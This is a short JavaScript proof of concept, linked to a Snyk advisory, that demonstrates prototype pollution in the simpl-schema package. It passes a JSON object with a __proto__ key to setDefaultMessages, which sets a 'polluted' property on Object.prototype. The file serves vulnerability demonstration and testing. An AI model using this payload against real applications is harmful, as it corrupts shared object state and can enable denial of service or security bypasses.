//https://snyk.io/vuln/SNYK-JS-SIMPLSCHEMA-1016157
 
  const SimpleSchema = require("simpl-schema").default;
  let obj = {};

   

  SimpleSchema.setDefaultMessages(
    JSON.parse('{"__proto__":{"polluted":"yes"}}')
  );
// End of file
